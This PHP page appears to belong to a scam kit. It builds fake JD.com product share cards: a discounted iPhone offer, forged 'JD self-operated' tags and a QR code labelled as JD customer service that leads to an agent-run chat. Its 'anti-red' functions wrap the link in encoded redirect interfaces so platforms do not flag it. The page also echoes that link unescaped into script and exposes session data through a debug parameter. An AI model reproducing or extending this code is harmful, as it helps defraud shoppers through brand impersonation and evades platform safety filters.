<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin();

$currentAgent = $_SESSION['username'];

function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '京东') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}

$customerName = generateCustomerName();
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '京东');

$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;
$originalServiceUrl = $baseUrl . '/' . "ChatJD" . '?id=' . $sessionId;

// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}
// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>
	
	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/jingdong.css">
</head>
<body> 
<div id="app" data-v-app="">
    <div class="app-container">
        <div class="scroll-container">

            <div class="form-container">
               <div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
                <div class="form-row">
                    <label>标题</label>
                    <input type="text" id="title-input" placeholder="请输入商品标题">
                </div>
                <div class="form-row">
                    <label>价格</label>
                    <input type="text" id="price-input" placeholder="请输入价格">
                </div>
                <div class="form-row">
                    <label>原价</label>
                    <input type="text" id="old-price-input" placeholder="请输入原价">
                </div>
                <div class="form-row" style="
    padding: 10px;">
                    <label>京东自营</label>
                    <div class="switch-container">
                        <label class="toggle-switch">
                            <input type="checkbox" id="jd-self-switch" checked>
                            <span class="switch-slider"></span>
                        </label>
                    </div>
                </div>
                <div class="form-row">
                    <label>标签1</label>
                    <div class="tag-input-row">
                        <input type="text" id="tag1-input" class="tag-input" placeholder="请输入标签内容">
                        <label class="toggle-switch">
                            <input type="checkbox" id="tag1-switch" checked>
                            <span class="switch-slider"></span>
                        </label>
                    </div>
                </div>
                <div class="form-row">
                    <label>标签2</label>
                    <div class="tag-input-row">
                        <input type="text" id="tag2-input" class="tag-input" placeholder="请输入标签内容">
                        <label class="toggle-switch">
                            <input type="checkbox" id="tag2-switch" checked>
                            <span class="switch-slider"></span>
                        </label>
                    </div>
                </div>
                <div class="form-row">
                    <label>标签3</label>
                    <div class="tag-input-row">
                        <input type="text" id="tag3-input" class="tag-input" placeholder="请输入标签内容">
                        <label class="toggle-switch">
                            <input type="checkbox" id="tag3-switch" checked>
                            <span class="switch-slider"></span>
                        </label>
                    </div>
                </div>
                <div class="form-row">
                    <label>封面图</label>
                    <label for="upload-cover" class="form-link" id="upload-label">上传图片</label>
                    <input type="file" accept="image/*" id="upload-cover" style="display: none;">
                </div>
            </div>
            <!-- 预览区域开始 -->
            <div class="XE-main">
                <div class="jd-share" id="jdShare">
                    <div class="share-banner">
                         <img src="/assets/img/17pro.webp" alt="" id="previewImage">
                        <div class="banner-tags">
                            <span class="tag promo">限时特惠</span>
                            <span class="tag self">京东自营</span>
                            <span class="tag hot">爆款热卖</span>
                        </div>
                    </div>
                    <div class="share-info">
                        <div class="goods-title" id="preview-title">【京东自营】Apple iPhone 17 Promax 256GB 原色钛金属 支持移动联通电信5G 双卡双待手机</div>
                        <div class="price-section">
                            <div class="price-box">
                                <span class="price-icon">¥</span>
                                <span class="goods-price" id="preview-price">7999</span>
                                <span class="old-price" id="preview-old-price">¥8999</span>
                            </div>
                            <div class="coupon-list" id="preview-coupons">
                                <span class="coupon">满5000减300</span>
                                <span class="coupon">以旧换新补贴500</span>
                                <span class="coupon">赠20W快充头</span>
                            </div>
                        </div>
                        <div class="meta-info">
                            <div class="sales">
                                退货包运费
                            </div>
                            <div class="delivery">
                                次日送达
                            </div>
                        </div>
                        <div class="qrcode-area">
                            <div class="qrcode-box">
                                <div id="qrcode-container"></div>
                            </div>
                            <div class="qrcode-tip">扫码联系京东客服</div>
                            <div class="qrcode-subtip">限时特惠享专属优惠</div>
                        </div>
                    </div>
                    <div class="share-footer">
                        <img src="/assets/img/hide.webp" class="jd-logo" alt="logo">
                        <div class="jd-brand">
                            <span class="jd-name">京东</span>
                            <span class="jd-slogan">多·快·好·省</span>
                        </div>
                    </div>
                </div>
            </div>
            <!-- 预览区域结束 -->
        </div>
    </div>
</div>
<script src="/assets/qrcode.min.js"></script>
<script src="/assets/qrcode-helper.js"></script>
<script>
// 生成二维码 - 使用PHP动态生成的链接
var qrCodeUrl = "<?php echo $serviceUrl; ?>";

document.addEventListener('DOMContentLoaded', function() {
    // 获取DOM元素
    const titleInput = document.getElementById('title-input');
    const priceInput = document.getElementById('price-input');
    const oldPriceInput = document.getElementById('old-price-input');
    const jdSelfSwitch = document.getElementById('jd-self-switch');
    const tag1Input = document.getElementById('tag1-input');
    const tag2Input = document.getElementById('tag2-input');
    const tag3Input = document.getElementById('tag3-input');
    const tag1Switch = document.getElementById('tag1-switch');
    const tag2Switch = document.getElementById('tag2-switch');
    const tag3Switch = document.getElementById('tag3-switch');
    const uploadCover = document.getElementById('upload-cover');
    const uploadLabel = document.getElementById('upload-label');

    // 预览区域元素
    const previewTitle = document.getElementById('preview-title');
    const previewPrice = document.getElementById('preview-price');
    const previewOldPrice = document.getElementById('preview-old-price');
    const previewImage = document.querySelector('.share-banner img');
    const previewCoupons = document.getElementById('preview-coupons');
    const jdSelfTag = document.querySelector('.tag.self');
    const qrcodeBox = document.querySelector('.qrcode-box');

    // 初始化标签内容
    tag1Input.value = '满5000减300';
    tag2Input.value = '以旧换新补贴500';
    tag3Input.value = '赠20W快充头';

    // 生成二维码
    if (qrcodeBox && typeof QRCode !== 'undefined') {
        // 清空二维码容器
        qrcodeBox.innerHTML = '';

        // 创建新的二维码
        try {
            new QRCode(qrcodeBox, {
                text: qrCodeUrl,
                width: getQRSize(qrCodeUrl, 110),
                height: getQRSize(qrCodeUrl, 110),
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: getQRCorrectLevel(qrCodeUrl)
            });
        } catch(e) {
            console.error('QR码生成失败，尝试降级:', e);
            try {
                qrcodeBox.innerHTML = '';
                new QRCode(qrcodeBox, {
                    text: qrCodeUrl,
                    width: 140,
                    height: 140,
                    colorDark: "#000000",
                    colorLight: "#ffffff",
                    correctLevel: QRCode.CorrectLevel.L
                });
            } catch(e2) {
                qrcodeBox.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:110px;height:110px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
            }
        }

        // 在二维码中间添加logo图标
        var logoImg = document.createElement('img');
        logoImg.src = '/assets/img/hide.webp';
        logoImg.style.position = 'absolute';
        logoImg.style.top = '50%';
        logoImg.style.left = '50%';
        logoImg.style.transform = 'translate(-50%, -50%)';
        logoImg.style.width = '24px';
        logoImg.style.height = '24px';
        logoImg.style.borderRadius = '24px';
        logoImg.style.background = 'white';
        logoImg.style.padding = '2px';
        logoImg.style.boxShadow = '0 0 4px rgba(0,0,0,0.2)';
        qrcodeBox.style.position = 'relative';
        qrcodeBox.appendChild(logoImg);
    } else {
        console.error("二维码容器或QRCode库未找到");
    }
    
    // 标题输入监听
    titleInput.addEventListener('input', function() {
        previewTitle.textContent = this.value || '商品标题';
    });
    
    // 价格输入监听
    priceInput.addEventListener('input', function() {
        previewPrice.textContent = this.value || '0';
    });
    
    // 原价输入监听
    oldPriceInput.addEventListener('input', function() {
        previewOldPrice.textContent = '¥' + (this.value || '0');
    });
    
    // 京东自营开关监听
    jdSelfSwitch.addEventListener('change', function() {
        jdSelfTag.style.display = this.checked ? 'inline-block' : 'none';
    });
    
    // 标签1输入和开关监听
    tag1Input.addEventListener('input', updateCoupons);
    tag1Switch.addEventListener('change', updateCoupons);
    
    // 标签2输入和开关监听
    tag2Input.addEventListener('input', updateCoupons);
    tag2Switch.addEventListener('change', updateCoupons);
    
    // 标签3输入和开关监听
    tag3Input.addEventListener('input', updateCoupons);
    tag3Switch.addEventListener('change', updateCoupons);
    
    // 更新优惠券显示
    function updateCoupons() {
        let couponsHTML = '';
        
        if (tag1Switch.checked && tag1Input.value) {
            couponsHTML += `<span class="coupon">${tag1Input.value}</span>`;
        }
        
        if (tag2Switch.checked && tag2Input.value) {
            couponsHTML += `<span class="coupon">${tag2Input.value}</span>`;
        }
        
        if (tag3Switch.checked && tag3Input.value) {
            couponsHTML += `<span class="coupon">${tag3Input.value}</span>`;
        }
        
        previewCoupons.innerHTML = couponsHTML;
    }
    
    // 封面图上传监听
    uploadCover.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                // 检查previewImage是否存在
                if (previewImage) {
                    previewImage.src = e.target.result;
                    uploadLabel.textContent = '已上传';
                } else {
                    console.error('预览图片元素未找到');
                }
            };
            reader.readAsDataURL(file);
        }
    });
    
    // 初始化页面
    updateCoupons();
});
</script>
<script>
    var qrCodeUrl = '<?php echo $serviceUrl; ?>';
    
    function copyToClipboard(text) {
        return new Promise(function(resolve, reject) {
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(function() {
                    resolve(true);
                }).catch(function(err) {
                    console.error('复制失败:', err);
                    fallbackCopy(text, resolve, reject);
                });
            } else {
                fallbackCopy(text, resolve, reject);
            }
        }).then(function(success) {
            if (success) {
                showToast('链接已复制到剪贴板！', 'success');
            } else {
                showToast('复制失败，请手动复制', 'error');
            }
        });
    }

    function fallbackCopy(text, resolve, reject) {
        var textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        textArea.style.top = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
            var successful = document.execCommand('copy');
            document.body.removeChild(textArea);
            resolve(successful);
        } catch (err) {
            console.error('复制失败:', err);
            document.body.removeChild(textArea);
            resolve(false);
        }
    }

    function showToast(message, type) {
        var container = document.getElementById('notification-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'notification-container';
            container.className = 'notification-container';
            document.body.appendChild(container);
        }

        var toast = document.createElement('div');
        toast.className = 'new-user-toast notification-enter-active';
        if (type) {
            toast.classList.add(type);
        }

        var icon = document.createElement('div');
        icon.className = 'toast-icon';
        icon.textContent = type === 'error' ? '!' : '✓';
        toast.appendChild(icon);

        var text = document.createElement('div');
        text.className = 'toast-text';
        text.textContent = message;
        toast.appendChild(text);

        var closeBtn = document.createElement('button');
        closeBtn.className = 'toast-close';
        closeBtn.innerHTML = '&times;';
        closeBtn.addEventListener('click', function() {
            removeToast(toast);
        });
        toast.appendChild(closeBtn);

        container.appendChild(toast);

        setTimeout(function() {
            toast.classList.add('notification-leave-active');
            setTimeout(function() {
                removeToast(toast);
            }, 300);
        }, 4000);

        function removeToast(toast) {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        var copyLinkBtn = document.getElementById('copy-link-btn');
        if (copyLinkBtn) {
            copyLinkBtn.addEventListener('click', function() {
                copyToClipboard(qrCodeUrl);
            });
        }
    });
</script>
</body>
</html>